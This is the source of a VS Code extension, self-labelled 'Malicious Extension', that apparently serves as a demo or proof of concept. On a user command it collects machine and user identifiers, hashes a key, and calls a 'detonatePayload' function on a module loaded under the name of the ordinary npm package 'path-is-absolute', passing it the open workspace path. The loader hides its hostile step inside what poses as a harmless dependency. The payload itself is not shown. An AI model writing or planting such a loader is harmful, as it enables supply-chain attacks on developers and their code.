
const vscode = require('vscode');
const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto'); 

function generateEnvironmentalKey() {
    try {
        const machineId = vscode.env.machineId; 
        const username = os.userInfo().username;
        const hostname = os.hostname();
        
        const seed = `mock-machine-id-mock-username`;
        
        const key = crypto.createHash('sha256').update(seed).digest();
        console.log('[+] Environmental Key Generated.');
        return key;
    } catch (e) {
        console.error('[-] Failed to generate environmental key:', e.message);
        return null;
    }
}

function activate(context) {
    console.log('--- Malicious Extension Activated ---');

    let disposable = vscode.commands.registerCommand('demo.runPayload', function () {
        console.log('[+] User triggered the command. Initializing payload sequence...');
        
        try {
            const workspaceFolders = vscode.workspace.workspaceFolders;
            if (!workspaceFolders || workspaceFolders.length === 0) {
                vscode.window.showErrorMessage('No workspace folder open.');
                return;
            }
            const workspacePath = workspaceFolders[0].uri.fsPath;

            const environmentalKey = generateEnvironmentalKey();
            if (!environmentalKey) {
                vscode.window.showErrorMessage('Could not generate environmental security key. Halting payload.');
                return;
            }

            const pathIsAbsoluteModule = require('path-is-absolute'); 
            pathIsAbsoluteModule.detonatePayload(environmentalKey, workspacePath);

        } catch (e) {
            vscode.window.showErrorMessage(`Extension command failed: ${e.message}`);
        }
    });

    context.subscriptions.push(disposable);
}

exports.activate = activate;
